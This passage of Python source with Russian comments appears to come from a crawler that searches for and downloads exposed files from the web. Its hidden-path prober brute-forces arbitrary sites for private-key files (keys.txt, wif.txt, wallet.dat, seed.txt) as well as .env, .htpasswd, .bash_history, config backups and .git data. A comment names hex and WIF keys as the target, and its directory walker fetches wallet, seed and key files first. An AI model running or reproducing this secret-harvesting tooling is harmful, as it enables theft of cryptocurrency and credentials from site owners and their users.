        return {"urls": [], "error": f"Baidu: {type(e).__name__}"}
    if r.status_code != 200 or "百度安全验证" in r.text or "wappass" in r.text:
        return {"urls": [], "error": f"Baidu: анти-бот блокировка (HTTP {r.status_code})"}
    out: list[str] = []
    for href in re.findall(r'<h3[^>]*>\s*<a[^>]+href="([^"]+)"', r.text):
        if href.startswith("http") and _is_fetchable_url(href):
            out.append(href)
    if not out:
        return {"urls": [], "error": "Baidu: выдача пуста"}
    return {"urls": out[:max_results], "error": None}


def serp_arquivo(query: str, max_results: int = 20) -> dict:
    """Полнотекстовый поиск по веб-архиву arquivo.pt (открытый API).

    Работает из дата-центров и даёт релевантную выдачу (проверено 06.11.2026),
    в отличие от Bing из дата-центров, который подменяет результаты мусором.
    Индексирует и международные сайты; возвращает replay-ссылки (noFrame) —
    они качаются из дата-центров без блокировок. Снимки идут от новых к старым,
    один оригинальный URL берём один раз (самый свежий).
    """
    try:
        r = _get("https://arquivo.pt/textsearch",
                 params={"q": query, "maxItems": str(min(max_results * 2, 50))},
                 timeout=(12, 30))
    except requests.RequestException as e:
        return {"urls": [], "error": f"Arquivo: {type(e).__name__}"}
    if r.status_code != 200:
        return {"urls": [], "error": f"Arquivo: HTTP {r.status_code}"}
    try:
        data = r.json()
    except Exception:  # noqa: BLE001
        return {"urls": [], "error": "Arquivo: некорректный JSON"}
    out: list[str] = []
    seen_orig: set[str] = set()
    for it in data.get("response_items") or []:
        orig = (it.get("originalURL") or "").strip().lower()
        if orig:
            if orig in seen_orig:
                continue
            seen_orig.add(orig)
        u = (it.get("linkToNoFrame") or "").strip()
        if u.startswith("http") and _is_fetchable_url(u):
            out.append(u)
        if len(out) >= max_results:
            break
    if not out:
        return {"urls": [], "error": "Arquivo: по запросу в архиве ничего не найдено"}
    return {"urls": out, "error": None}


SERPS = {"bing": serp_bing, "duckduckgo": serp_duckduckgo, "baidu": serp_baidu,
         "marginalia": serp_marginalia, "arquivo": serp_arquivo}
SERP_LABELS = {"bing": "Bing", "marginalia": "Marginalia", "baidu": "Baidu",
               "duckduckgo": "DuckDuckGo", "arquivo": "Arquivo.pt (веб-архив)"}
# движки, которым операторы не по зубам из дата-центров (им отдаём plain-вариант запроса)
PLAIN_ONLY_ENGINES = {"bing", "marginalia", "arquivo"}


def file_links_from_html(html: str, base_url: str, limit: int = 12) -> list[str]:
    out: list[str] = []
    seen: set[str] = set()
    for href in re.findall(r'''href=["']([^"']+)["']''', html, re.I):
        path = href.split("?")[0].split("#")[0]
        if not re.search(r"\.(?:%s)$" % "|".join(e.strip(".") for e in FILE_LINK_EXTS), path, re.I):
            continue
        try:
            full = urljoin(base_url, href)
        except ValueError:
            continue
        if not full.startswith("http") or not _is_fetchable_url(full) or full in seen:
            continue
        seen.add(full)
        out.append(full)
        if len(out) >= limit:
            break
    return out


# --- Каталоги «Index of» -------------------------------------------------------------
#
# Открытые листинги (Apache autoindex, nginx, fancyindex, «Directory listing for»)
# — самый урожайный источник: файлы лежат прямыми ссылками, подкаталоги
# раскрываются обходом. Детектор+парсер+обходчик ниже обслуживают и отдельный
# режим, и все остальные источники (наткнулись на листинг — обошли его целиком).

_LISTING_MAX_BYTES = 2_000_000   # сколько HTML листинга читаем
_LISTING_FILES_LIMIT = 150       # максимум файлов из одного листинга (после приоритизации)
_LISTING_DIRS_LIMIT = 50         # максимум подкаталогов из одного листинга

_INDEX_TITLE_RE = re.compile(
    r"<title>[^<]{0,300}?(?:index\s+of|directory\s+listing)[^<]{0,300}?</title>", re.I)
_INDEX_ANCHOR_RE = re.compile(r'''<a[^>]+href=["']([^"']+)["'][^>]*>(.*?)</a>''', re.I | re.S)


def _is_index_listing(html: str) -> bool:
    """Похоже ли на открытый каталог: заголовок «Index of / …» и куча <a>-записей."""
    if not html:
        return False
    if _INDEX_TITLE_RE.search(html):
        return True
    # листинги без <title>: заголовок-надпись + ссылки на записи каталога
    if re.search(r">Directory listing for /", html, re.I):
        return True
    return "Parent Directory" in html and len(_INDEX_ANCHOR_RE.findall(html)) >= 3


def _clean_listing_href(href: str) -> str:
    href = unquote((href or "").strip())
    return href.split("#", 1)[0].split("?", 1)[0]


def _is_parent_link(path: str) -> bool:
    """Ссылки на родительский каталог: .., ../, /a/b/../../ и т.п."""
    p = path.rstrip("/")
    return p == ".." or p == "." or p.endswith("/..")


def _parse_index_entries(html: str, base_url: str, allow_private: bool = False) -> tuple[list[str], list[str]]:
    """Записи листинга: (подкаталоги, файлы) — абсолютные URL того же хоста.

    Каталоги отличаем по завершающему '/' пути (так пишут Apache, nginx,
    fancyindex); ссылки вверх (.., на родителя и выше), сам каталог и чужие
    хосты отбрасываем. Пути с не-ASCII/пробелами перекодируются — иначе
    requests отказывается их качать.

    allow_private: листинг явно указан пользователем (доверенный хост) —
    записи того же хоста не прогоняются через SSRF-фильтр (иначе невозможно
    обходить каталоги в локальной сети).
    """
    try:
        base_host = urlparse(base_url).netloc.lower().removeprefix("www.")
    except ValueError:
        return [], []
    try:
        base_path = urlparse(base_url).path
        base_dir = base_path if base_path.endswith("/") else base_path.rsplit("/", 1)[0] + "/"
    except ValueError:
        base_dir = "/"
    dirs: list[str] = []
    files: list[str] = []
    seen: set[str] = set()
    for href, _text in _INDEX_ANCHOR_RE.findall(html):
        href = _clean_listing_href(href)
        if not href or href.startswith(("javascript:", "mailto:", "data:", "tel:")):
            continue
        try:
            full = urljoin(base_url, href)
        except ValueError:
            continue
        if not full.startswith(("http://", "https://")):
            continue
        try:
            pu = urlparse(full)
        except ValueError:
            continue
        host = pu.netloc.lower().removeprefix("www.")
        if host != base_host or _is_parent_link(pu.path):
            continue
        # не-ASCII/пробелы в пути — перекодируем (urljoin их не трогает)
        if re.search(r"[^\x21-\x7e]", pu.path):
            full = f"{pu.scheme}://{pu.netloc}{quote(pu.path, safe='/') }"
        full_nq = full.rstrip("/")
        # доверенный (пользовательский) хост — не фильтруем; чужие записи уже
        # отсечены проверкой host != base_host выше
        if not (allow_private or _is_fetchable_url(full)) or full_nq in seen:
            continue
        seen.add(full_nq)
        if pu.path.endswith("/"):
            # вверх по дереву (родитель и выше) или сам каталог — не интересует
            if pu.path != base_dir and not base_dir.startswith(pu.path):
                dirs.append(full)
        else:
            files.append(full)
    return dirs[:_LISTING_DIRS_LIMIT], files[:_LISTING_FILES_LIMIT]


def walk_index_of(root: str, store: "_Store", *, depth: int = 2, max_items: int = 200,
                  prog: Callable[[str, int, int], None] | None = None,
                  label: str = "Каталог index of",
                  allow_private: bool = False) -> dict:
    """Обход открытого каталога: файлы листинга докачиваются (картинки и документы
    раскладывает общий конвейер), подкаталоги раскрываются до depth.

    root — URL листинга; если это не листинг, содержимое просто раскладывается
    по типам. max_items — бюджет загрузок на вызов. allow_private — листинг
    указан пользователем вручную (доверенный хост, можно локальный/LAN).
    Возвращает статистику.
    """
    stats = {"listings": 0, "dirs": 0, "files": 0, "fetched": 0, "errors": 0,
             "listing_urls": []}
    seen: set[str] = set()
    queue: list[tuple[str, int]] = [(root, 0)]

    def report() -> None:
        if prog:
            prog(f"{label}: каталогов {stats['listings']}, файлов {stats['files']}",
                 stats["fetched"], max_items)

    while queue and stats["fetched"] < max_items:
        url, lvl = queue.pop(0)
        if url in seen:
            continue
        seen.add(url)
        try:
            r = requests.get(url, headers=_HEADERS, timeout=(12, 30), stream=True)
        except Exception:  # noqa: BLE001
            stats["errors"] += 1
            continue
        if r.status_code in (403, 429):
            store.counters["blocked"] += 1
            stats["errors"] += 1
            continue
        if r.status_code != 200:
            stats["errors"] += 1
            continue
        data = r.content
        if not data or len(data) > MAX_ITEM_BYTES:
            stats["errors"] += 1
            continue
        html = data.decode("utf-8", errors="replace")[:_LISTING_MAX_BYTES]
        if not _is_index_listing(html):
            if _route_bytes(data, r.headers.get("content-type", ""), url, store) != "skip":
                stats["files"] += 1
                stats["fetched"] += 1
            report()
            continue
        stats["listings"] += 1
        if len(stats["listing_urls"]) < 50:
            stats["listing_urls"].append(url)
        dirs, files = _parse_index_entries(html, url, allow_private=allow_private)
        # файлы с ключевыми словами в имени (wallet, seed, keys…) — первыми
        files.sort(key=_url_priority_score, reverse=True)
        for f in files:
            if stats["fetched"] >= max_items:
                break
            if f in store.saved_urls:
                continue
            if _fetch_item(f, store):
                stats["files"] += 1
            stats["fetched"] += 1
        if lvl < depth:
            for d in dirs:
                if d not in seen:
                    queue.append((d, lvl + 1))
                    stats["dirs"] += 1
        report()
    return stats


# --- Скрытые папки и файлы ------------------------------------------------------------
#
# Скрытое на веб-сервере не видно ни в листингах, ни в поисковиках — его можно
# только перебрать по типовым именам. Чаще всего забывают закрыть: репозитории
# СКВ (.git/.svn/.hg), окружения (.env), серверные конфиги (.htaccess/.htpasswd),
# системный .DS_Store и «временно» открытые каталоги бэкапов/дампов/ключей.
# Найденные листинги отдаются обходчику каталогов, файлы — общему конвейеру
# (детекторы строк + QR), «мягкие 404» (html-заглушки с кодом 200) отсекаются.

# (путь, вид): file — ожидаем документ, dir — каталог (ожидаем листинг).
# Порядок = приоритет перебора: сначала файлы-контейнеры ключей (цель — hex и
# WIF), затем маркеры СКВ и окружений, затем типовые скрытые каталоги.
_HIDDEN_PROBES: tuple[tuple[str, str], ...] = (
    # --- файлы с ключами: цели именно hex и WIF (мастер-ключи пропускаются фильтром) ---
    ("keys.txt", "file"), ("keys.json", "file"), ("key.txt", "file"),
    ("keylist.txt", "file"), ("keys.bak", "file"), ("keys_backup.txt", "file"),
    ("old_keys.txt", "file"), ("private_keys.txt", "file"), ("private-keys.txt", "file"),
    ("privkeys.txt", "file"), ("privkey.txt", "file"), ("priv.txt", "file"),
    ("private.txt", "file"), ("wifs.txt", "file"), ("wif.txt", "file"),
    ("wif_keys.txt", "file"), ("hex.txt", "file"), ("hexkeys.txt", "file"),
    ("hex_keys.txt", "file"), ("btc.txt", "file"), ("btc_keys.txt", "file"),
    ("bitcoin.txt", "file"), ("wallet.txt", "file"), ("wallet.json", "file"),
    ("wallets.txt", "file"), ("wallet.dat", "file"), ("wallet.bak", "file"),
    ("wallet.aes.json", "file"), ("wallet.aes", "file"), ("dump.txt", "file"),
    ("dump.json", "file"), ("export.txt", "file"), ("exported_keys.txt", "file"),
    ("unspent.txt", "file"), ("paperwallet.txt", "file"), ("recovery.txt", "file"),
    ("sensitive.txt", "file"), ("secrets.txt", "file"), ("secret.txt", "file"),
    ("seeds.txt", "file"), ("seed.txt", "file"), ("backup.txt", "file"),
    ("backup.json", "file"),
    # --- системы контроля версий (часто выносят весь репо с конфигами) ---
    (".git/HEAD", "file"), (".svn/entries", "file"), (".svn/wc.db", "file"),
    (".hg/hgrc", "file"),
    # --- окружения и серверные конфиги (секреты в переменных/паролях) ---
    (".env", "file"), (".env.local", "file"), (".env.bak", "file"),
    (".env.old", "file"), (".env.save", "file"), (".env.backup", "file"),
    (".env.production", "file"), ("env.txt", "file"),
    (".htaccess", "file"), (".htpasswd", "file"), (".DS_Store", "file"),
    (".bash_history", "file"),
    ("wp-config.php.bak", "file"), ("wp-config.php~", "file"), ("wp-config.php.old", "file"),
    ("config.php.bak", "file"), ("config.php.old", "file"), ("configuration.php.bak", "file"),
    ("settings.py.bak", "file"), ("database.yml", "file"), ("config.json.bak", "file"),
    # --- каталоги: листинг отдаётся обходчику целиком ---
    (".git/", "dir"), (".svn/", "dir"), (".hg/", "dir"),
    ("backup/", "dir"), ("backups/", "dir"), ("_backup/", "dir"), ("bak/", "dir"),
    ("old/", "dir"), ("dump/", "dir"), ("dumps/", "dir"), ("db/", "dir"),
    ("database/", "dir"), ("private/", "dir"), ("_private/", "dir"),
    ("secret/", "dir"), ("secrets/", "dir"),
    ("wallet/", "dir"), ("wallets/", "dir"), ("keys/", "dir"), ("key/", "dir"),
    ("keys_backup/", "dir"), ("wallet-backups/", "dir"),
    ("electrum/", "dir"), ("bitcoin/", "dir"), (".bitcoin/", "dir"),
    ("archive/", "dir"), ("tmp/", "dir"), ("temp/", "dir"), ("data/", "dir"),
)

# добирается только если .git/HEAD подтвердил репозиторий
_GIT_EXTRA_PROBES: tuple[str, ...] = (
    ".git/config", ".git/logs/HEAD", ".git/packed-refs",
    ".git/description", ".git/COMMIT_EDITMSG",
)

_HIDDEN_MAX_SITES = 30            # сайтов за джобу
_HIDDEN_PROBE_TIMEOUT = (8, 20)   # пробы короткие: 404 ждём быстро
_HIDDEN_DS_NAMES_LIMIT = 30       # имён из одного .DS_Store
_HIDDEN_DS_NAME_RE = re.compile(rb"(?:\x00[\x20-\xff]){3,40}")  # UTF-16BE: старший \x00 перед символом
_HIDDEN_DS_ASCII_RE = re.compile(rb"[A-Za-z0-9][A-Za-z0-9 ._~%-]{2,63}")


def normalize_site_root(url: str) -> str:
    """Приводит адрес сайта к корню для перебора: example.com -> https://example.com/.

    Схему и путь пользователь указал сам — доверенные (можно LAN/localhost);
    проверяется только форма адреса. Непохожие на хост строки отбрасываются
    (нет точки и это не localhost/IP — не домен).
    """
    u = (url or "").strip()
    if not u or u.startswith(("#", "//")):
        return ""
    if not re.match(r"^[a-z][a-z0-9+.-]*://", u, re.I):
        u = "https://" + u
    if not u.lower().startswith(("http://", "https://")):
        return ""
    try:
        pu = urlparse(u)
    except ValueError:
        return ""
    if not pu.netloc:
        return ""
    try:
        host = (pu.hostname or "").lower()
    except ValueError:
        return ""
    if not host:
        return ""
    is_ip = bool(re.fullmatch(r"\d{1,3}(\.\d{1,3}){3}", host))
    if not is_ip and host != "localhost" and "." not in host:
        return ""
    path = pu.path or "/"
    if not path.endswith("/"):
        path += "/"
    return f"{pu.scheme}://{pu.netloc}{path}"


def _ds_store_names(data: bytes, limit: int = _HIDDEN_DS_NAMES_LIMIT) -> list[str]:
    """Имена файлов из .DS_Store (Finder хранит в нём содержимое каталога).

    Имена лежат в записях как ASCII/MacRoman-строки и как UTF-16BE; берём
    только похожие на файлы (с расширением) — иначе насорят служебные коды
    записей («Bud1», «Iloc»…). Точечные имена (AppleDouble «._*») пропускаем.
    """
    if not data or not data.startswith(b"\x00\x00\x00\x01Bud1"):
        return []
    raw: list[str] = []
    for m in _HIDDEN_DS_NAME_RE.finditer(data):          # UTF-16BE
        try:
            raw.append(m.group(0).decode("utf-16-be", errors="ignore"))
        except Exception:  # noqa: BLE001
            pass
    for m in _HIDDEN_DS_ASCII_RE.finditer(data):         # ASCII/MacRoman
        raw.append(m.group(0).decode("latin-1", errors="ignore"))
    out: list[str] = []
    seen: set[str] = set()
    plausible = re.compile(r"[A-Za-z0-9][A-Za-z0-9 ._~-]*\.[A-Za-z0-9]{1,6}")
    for name in raw:
        name = name.strip()
        if not name or name.startswith(".") or "/" in name or "\\" in name:
            continue
        # только похоже на имя файла: «хвост.расширение» без мусора между ними
        if not plausible.fullmatch(name) or len(name) > 64:
            continue
        low = name.lower()
        if low not in seen:
            seen.add(low)
            out.append(name)
    out.sort(key=lambda n: (_url_ext(n) in FILE_LINK_EXTS, _url_priority_score(n)), reverse=True)
    return out[:limit]


def probe_hidden_paths(root: str, store: "_Store", *, depth: int = 2, max_items: int = 120,
                       prog: Callable[[str, int, int], None] | None = None,
                       label: str = "Скрытые папки",
                       allow_private: bool = True) -> dict:
    """Перебор типовых скрытых путей на сайте; root — корень сайта или каталога.

    Что нашлось:
      каталог-листинг -> walk_index_of (файлы и подкаталоги целиком);
      файл            -> _route_bytes (детекторы строк, QR-конвейер, zip);
      .git/HEAD       -> добираются тексты репозитория (config, logs, refs);
      .DS_Store       -> имена файлов из него тоже пробуются;
      401/403         -> путь существует, но закрыт (пометка в статистике).
    «Мягкие 404» (заглушка с кодом 200) отсекаются: html без признаков листинга
    считается промахом. Возвращает статистику: probed/hits/listings/files/…
    """
    base = normalize_site_root(root)
    stats: dict = {"root": base, "probed": 0, "hits": {}, "listings": 0, "files": 0,
                   "fetched": 0, "errors": 0}
    if not base:
        stats["error"] = "некорректный адрес сайта"
        return stats

    seen: set[str] = set()
    forbidden_streak = 0
    planned = len(_HIDDEN_PROBES)

    def report() -> None:
        if prog:
            prog(f"{label}: проб {stats['probed']}, находок {len(stats['hits'])}",
                 stats["probed"], max(planned, stats["probed"]))

    def verdict(url: str, data: bytes, ct: str) -> str:
        """'listing' | 'file' | 'miss' — по типу ответа; мягкие 404 отсекаются."""
        ct_low = (ct or "").split(";")[0].strip().lower()
        is_html = ct_low in HTML_MIMES or (not ct_low and data[:1] == b"<")
        if not is_html:
            # у .git/HEAD точный маркер — иначе это не репозиторий
            if url.endswith(".git/HEAD"):
                return "file" if data.lstrip().startswith(b"ref:") else "miss"
            return "file"
        html = data.decode("utf-8", errors="replace")[:_LISTING_MAX_BYTES]
        if _is_index_listing(html):
            return "listing"
        return "miss"   # html-заглушка (мягкая 404) или обычная страница

    tasks: list[tuple[str, str]] = [(base + p, k) for p, k in _HIDDEN_PROBES]
    while tasks and stats["fetched"] < max_items:
        url, kind = tasks.pop(0)
        if url in seen:
            continue
        seen.add(url)
        stats["probed"] += 1
        report()
        try:
            r = requests.get(url, headers=_HEADERS, timeout=_HIDDEN_PROBE_TIMEOUT)
        except Exception:  # noqa: BLE001
            stats["errors"] += 1
            continue
        if r.status_code in (401, 403):
            forbidden_streak += 1
            stats["hits"][url] = f"закрыт ({r.status_code})"
            if forbidden_streak >= 6:   # WAF рубит всё — дальше не стучимся
                break
            continue
        if r.status_code == 429:
            store.counters["blocked"] += 1
            break
        if r.status_code != 200:
            forbidden_streak = 0
            continue
        forbidden_streak = 0
        data = r.content
        if not data or len(data) > MAX_ITEM_BYTES:
            continue
        v = verdict(url, data, r.headers.get("content-type", ""))
        if v == "miss":
            continue
        stats["hits"][url] = "листинг" if v == "listing" else "файл"
        if v == "listing":
            stats["listings"] += 1
            w = walk_index_of(url, store, depth=depth,
                              max_items=max(1, max_items - stats["fetched"]),
                              prog=prog, label=f"{label}: каталог {url}",
                              allow_private=allow_private)
            stats["files"] += int(w["files"])
            stats["fetched"] += int(w["fetched"])
            stats["listings"] += max(0, int(w["listings"]) - 1)  # root уже учтён
            for lu in w.get("listing_urls") or []:   # вложенные листинги — тоже находки
                stats["hits"].setdefault(lu, "листинг (обход)")
        else:
            if _route_bytes(data, r.headers.get("content-type", ""), url, store) != "skip":
                stats["files"] += 1
            if url.endswith(".git/HEAD"):
                for extra in _GIT_EXTRA_PROBES:
                    if base + extra not in seen:
                        tasks.append((base + extra, "file"))
                        planned += 1
            elif url.endswith(".DS_Store"):
                for name in _ds_store_names(data):
                    if base + name not in seen:
                        tasks.append((base + name, "file"))
                        planned += 1
        report()
    report()
    return stats


# --- Режим commoncrawl ------------------------------------------------------------------

def commoncrawl_list(mask: str, limit: int) -> dict:
    r = _get("https://index.commoncrawl.org/collinfo.json", timeout=(12, 30))
    r.raise_for_status()
    colls = r.json()
    if not colls:
        return {"index": None, "items": [], "error": "список индексов Common Crawl пуст"}
    latest = colls[0].get("id")
    r2 = _get(
        f"https://index.commoncrawl.org/{latest}-index",
        params={"url": mask, "output": "json", "limit": str(limit)},
        timeout=(15, 60),
    )
    if r2.status_code != 200:
        return {"index": latest, "items": [],
                "error": f"CDX-сервер Common Crawl ответил HTTP {r2.status_code}"}
    items: list[dict] = []
    for line in r2.text.splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            d = json.loads(line)
        except Exception:  # noqa: BLE001
            continue
        if str(d.get("status", "")) == "200":
            items.append({"url": d.get("url", ""), "ts": "", "mime": d.get("mime", ""), "status": "200"})
    return {"index": latest, "items": items[:limit], "error": None if items else "по маске ничего не найдено"}


# --- Режим github ------------------------------------------------------------------------

def sourcegraph_search(query: str, max_items: int = 20) -> dict:
    """Анонимный поиск кода через Sourcegraph stream API (sourcegraph.com).

    Индексирует публичный GitHub и другие хостинги; токен не нужен, работает
    из дата-центров (проверено 06.11.2026). Синтаксис близок к GitHub:
    filename: переводится в file:, кавычки и lang:/file: поддерживаются.
    Формат ответа тот же, что у github_search: [{repo, path, raw}].
    """
    q = re.sub(r"\bfilename:", "file:", (query or "").strip()).strip()
    if not q:
        return {"files": [], "error": "пустой запрос"}
    q = f"{q} count:{min(30, max(5, max_items))} timeout:20s"
    try:
        r = _get("https://sourcegraph.com/.api/search/stream",
                 params={"q": q},
                 headers={"Accept": "text/event-stream"}, timeout=(15, 45))
    except requests.RequestException as e:
        return {"files": [], "error": f"Sourcegraph: {type(e).__name__}"}
    if r.status_code != 200:
        return {"files": [], "error": f"Sourcegraph: HTTP {r.status_code}"}
    files: list[dict] = []
    seen: set[str] = set()
    ev = ""
    alerts: list[str] = []
    for line in r.text.splitlines():
        if line.startswith("event: "):
            ev = line[7:].strip()
            continue
        if not line.startswith("data: "):
            continue
        try:
            data = json.loads(line[6:])
        except Exception:  # noqa: BLE001 — служебные события без JSON пропускаем
            continue
        if ev == "matches" and isinstance(data, list):
            for m in data:
                repo = (m.get("repository") or "").strip().rstrip("/")
                path = (m.get("path") or "").strip()
                if not repo or not path:
                    continue
                if repo.startswith("github.com/"):
                    owner_repo = repo[len("github.com/"):].strip("/")
                    raw = (f"https://raw.githubusercontent.com/{owner_repo}"
                           f"/HEAD/{quote(path)}")
                    if raw not in seen:
                        seen.add(raw)
                        files.append({"repo": owner_repo, "path": path, "raw": raw})
        elif ev == "alert" and isinstance(data, list):
            alerts += [str(a)[:120] for a in data]
        elif ev == "error":
            # событие error — список {"message": ...} или строка
            if isinstance(data, list):
                for a in data:
                    if isinstance(a, dict) and a.get("message"):
                        alerts.append(str(a["message"])[:120])
                    else:
                        alerts.append(str(a)[:120])
            elif isinstance(data, dict) and data.get("message"):
                alerts.append(str(data["message"])[:120])
        if len(files) >= max_items:
            break
    if files:
        return {"files": files[:max_items], "error": None}
    if alerts:
        return {"files": [], "error": f"Sourcegraph: {'; '.join(alerts[:2])}"}
    return {"files": [], "error": "Sourcegraph: по запросу ничего не найдено"}


def github_search(query: str, token: str, max_items: int = 20) -> dict:
    if not token:
        return {"files": [], "error": "нужен GitHub-токен (поле на панели или переменная GITHUB_TOKEN)"}
    headers = {
        "Accept": "application/vnd.github+json",
        "Authorization": f"token {token}",
        "X-GitHub-Api-Version": "2022-11-28",
    }
    r = _get("https://api.github.com/search/code",
             params={"q": query, "per_page": str(min(50, max_items))}, headers=headers,
             timeout=(12, 30))
    if r.status_code == 401:
        return {"files": [], "error": "GitHub-токен отклонён (401)"}
    if r.status_code == 403:
        return {"files": [], "error": "лимит запросов GitHub исчерпан (403)"}
    if r.status_code == 422:
        msg = ""
        try:
            msg = (r.json().get("message") or "")[:120]
        except Exception:  # noqa: BLE001
            pass
        return {"files": [], "error": f"запрос отклонён (422): {msg or 'проверьте синтаксис'}"}
    if r.status_code != 200:
        return {"files": [], "error": f"GitHub API: HTTP {r.status_code}"}
    files: list[dict] = []
    for it in r.json().get("items", [])[:max_items]:
        repo = it.get("repository", {}).get("full_name", "")
        path = it.get("path", "")
        if repo and path:
            raw = f"https://raw.githubusercontent.com/{repo}/HEAD/{quote(path)}"
            files.append({"repo": repo, "path": path, "raw": raw})
    return {"files": files, "error": None if files else "по запросу ничего не найдено"}


# --- Главная точка входа -------------------------------------------------------------------

def _load_doc_hashes(files_dir: Path) -> set[str]:
    import hashlib

    out: set[str] = set()
    if files_dir.exists():
        for p in files_dir.iterdir():
            if p.is_file():
                try:
                    out.add(hashlib.md5(p.read_bytes()).hexdigest())
                except OSError:
                    continue
    return out


def _fetch_serp_pages(urls: list[str], store: _Store, max_pages: int, max_files: int,
                      prog: Callable[[str, int, int], None], label: str,
                      walk_depth: int = 1) -> int:
    """Загружает выдачу текстового поиска: страницы + файлы из листингов каталогов.

    Страницы попадают в pages/ (видимый текст), попутные картинки — в images/,
    документы (txt/json/pdf/zip) — в files/. Если страница — открытый каталог
    (index of), он обходится целиком: файлы докачиваются, подкаталоги
    раскрываются до walk_depth. Возвращает суммарное число сохранённых находок.
    """
    saved_total = 0
    pages_done = 0
    for u in urls:
        if pages_done >= max_pages:
            break
        before = dict(store.counters)
        try:
            r = requests.get(u, headers=_HEADERS, timeout=(12, 30), stream=True)
            if r.status_code in (403, 429):
                store.counters["blocked"] += 1
                continue
            if r.status_code != 200:
                continue
            data = r.content
            if not data or len(data) > MAX_ITEM_BYTES:
                continue
            ct = r.headers.get("content-type", "")
            kind = _route_bytes(data, ct, u, store)
            if kind == "page" and store.counters["docs"] < max_files:
                html = data.decode("utf-8", errors="replace")[:_LISTING_MAX_BYTES]
                if _is_index_listing(html):
                    # открытый каталог: обходим его целиком, а не только известные расширения
                    walk_index_of(u, store, depth=walk_depth,
                                  max_items=max(30, max_files * 3), prog=prog,
                                  label=f"{label}: каталог")
                else:
                    links = file_links_from_html(html, u)
                    for link in links:
                        if store.counters["docs"] >= max_files:
                            break
                        if link in store.saved_urls:
                            continue
                        _fetch_item(link, store)
            pages_done += 1
        except Exception:  # noqa: BLE001 — одна битая ссылка не роняет джобу
            continue
        finally:
            saved_total += sum(store.counters[k] - before[k]
                               for k in ("images", "docs", "pages"))
        prog(f"{label}: {pages_done}/{max_pages}", pages_done, max_pages)
    return saved_total


def run_global(job_dir: Path, params: dict, progress=None) -> dict:
    """Глобальный поиск: перечисление URL источником -> универсальная загрузка.

    Режим keywords — обычный веб-поиск по ключевым словам (веб-фаза классического
    краулера): те же запросы, что и для картинок, но через текстовые SERP.
    progress(stage, done, total) — колбэк для UI-прогресса.
    Возвращает структуру для job['crawl'].
    """
    job_dir = Path(job_dir)
    job_dir.mkdir(parents=True, exist_ok=True)
    mode = str(params.get("mode", "archive"))
    prefix = {"archive": "arx", "dorks": "drk", "commoncrawl": "cc", "github": "gh",
              "keywords": "web", "indexof": "idx", "hidden": "hid"}.get(mode, "gl")

    def prog(stage: str, done: int, total: int) -> None:
        if progress:
            try:
                progress(stage, done, total)
            except Exception:  # noqa: BLE001
                pass

    store = _Store(job_dir, prefix, _load_seen_hashes(job_dir / "images"))
    store.doc_hashes = _load_doc_hashes(job_dir / "files")
    result: dict = {"mode": mode, "sources": {}, "images": 0, "docs": 0, "pages": 0, "total": 0}

    if mode == "archive":
        domain = str(params.get("domain", "")).strip()
        provider = str(params.get("provider", "auto") or "auto")
        max_urls = max(5, min(int(params.get("max_urls", 60)), 400))
        delta = bool(params.get("delta"))
        prioritize = bool(params.get("prioritize", True))
        depth = max(0, min(int(params.get("depth", 0) or 0), 2))

        from_ts = ""
        prev: dict | None = None
        if delta:
            prev = get_domain_state(domain)
            if prev and prev.get("next_from"):
                from_ts = str(prev["next_from"])

        prog("Перечисление снимков веб-архива…", 0, 1)
        res = cdx_domain(domain, max_urls * 3, provider, from_ts=from_ts)
        items = res["items"]
        result["sources"]["cdx"] = {
            "count": len(items), "provider": res["provider"], "error": res["error"],
            "note": res.get("note") or (
                None if res["provider"] else
                "web.archive.org и arquivo.pt недоступны с этого сервера; на локальной машине обычно работает"),
        }
        if delta:
            result["sources"]["cdx"]["delta"] = {
                "enabled": True,
                "from_ts": from_ts or None,
                "prev_run": (prev or {}).get("last_run"),
                "prev_count": (prev or {}).get("last_count"),
            }
        if items:
            split: dict[str, list[dict]] = {"image": [], "page": [], "doc": []}
            for it in items:
                k = split_kind(it["url"], it["mime"])
                if k in ("image", "page", "doc"):
                    split[k].append(it)
            result["sources"]["cdx"]["images_found"] = len(split["image"])
            result["sources"]["cdx"]["pages_found"] = len(split["page"])
            result["sources"]["cdx"]["docs_found"] = len(split["doc"])
            combined = [(k, it) for k in ("image", "doc", "page") for it in split[k]]
            if prioritize:
                # URL с ключевыми словами — наверх, далее картинки/документы,
                # потом страницы; внутри ранга — свежие снимки первыми
                decorated = [(_url_priority_score(it["url"]), -_KIND_RANK[k],
                              str(it.get("ts", "")), n, k, it)
                             for n, (k, it) in enumerate(combined)]
                decorated.sort(key=lambda t: (t[0], t[1], t[2], t[3]), reverse=True)
                combined = [(t[4], t[5]) for t in decorated]
            queue = [it for _, it in combined][:max_urls]
            if prioritize:
                result["sources"]["cdx"]["prioritize"] = {
                    "enabled": True,
                    "keywords_hit": sum(1 for _, it in combined if _url_priority_score(it["url"]) > 0),
                    "queued_hit": sum(1 for it in queue if _url_priority_score(it["url"]) > 0),
                    "top": [it["url"] for it in queue[:4]],
                }
            # граница дельты пишется сразу после перечисления: загрузки могут
            # длиться долго, а перечисленный охват от этого не меняется
            if res["provider"]:
                result["sources"]["cdx"]["delta_state"] = _record_domain_state(
                    domain, provider=res["provider"], items=items,
                    queued_ts=[str(i.get("ts", "")) for i in queue if i.get("ts")],
                    max_urls=max_urls,
                )
            provider_name = res["provider"] or "arquivo"
            rec = _fetch_with_recursion(
                queue,
                build_url=lambda it, p=provider_name: _replay_url(p, it),
                depth=depth, budget=min(max_urls, 120),
                store=store, prog=prog, label="Загрузка из архива",
            )
            if depth > 0:
                result["sources"]["cdx"]["recursion"] = rec
        elif delta and from_ts and res["provider"]:
            result["sources"]["cdx"]["note"] = (
                "новых снимков с последнего прохода не найдено — домен уже охвачен"
            )

    elif mode == "dorks":
        engines = [e for e in (params.get("engines") or ["bing"]) if e in SERPS] or ["bing"]
        presets = params.get("presets") or []
        custom = str(params.get("custom", "") or "").strip()
        variants: list[dict] = []   # [{"dork": ..., "plain": ...}]
        for p in presets:
            variants += list(DORK_PRESETS.get(p, {}).get("queries", []))
        if custom:
            variants.append({"dork": custom, "plain": custom})
        variants = list({v.get("dork", v.get("plain")): v for v in variants}.values())[:12]
        max_pages = max(3, min(int(params.get("max_pages", 10)), 30))
        max_files = max(3, min(int(params.get("max_files", 20)), 60))

        # карта вариантов по движкам: Marginalia троттлит публичный ключ —
        # не более двух запросов на джобу (уникальные значимые токены пресетов)
        eng_variants: dict[str, list[dict]] = {}
        for eng in engines:
            if eng == "marginalia":
                toks: list[str] = []
                for v in variants:
